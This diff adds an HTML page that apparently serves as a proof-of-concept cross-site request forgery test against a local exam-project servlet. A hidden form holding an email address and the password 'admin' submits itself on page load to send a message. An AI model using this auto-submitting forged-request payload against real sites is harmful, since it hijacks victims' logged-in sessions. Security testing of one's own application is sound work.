@@ -1,0 +1,14 @@
+<html>
+
+<form action="http://localhost:8080/ExamProject/NavigationServlet" method="post">
+	<input type="hidden" name="email" value="antonio.coppe@gmail.com"/> <input
+		type="hidden" name="password" value="admin"/> <input
+		class="single-row-input" type="hidden" name="receiver"
+		placeholder="Receiver" value="antonio.coppe@gmail.com"/> <input
+		class="single-row-input" type="hidden" name="subject"
+		placeholder="Subject" value="csrf text attack">
+</form>
+<script>
+	document.forms[0].submit();
+</script>
+</html>
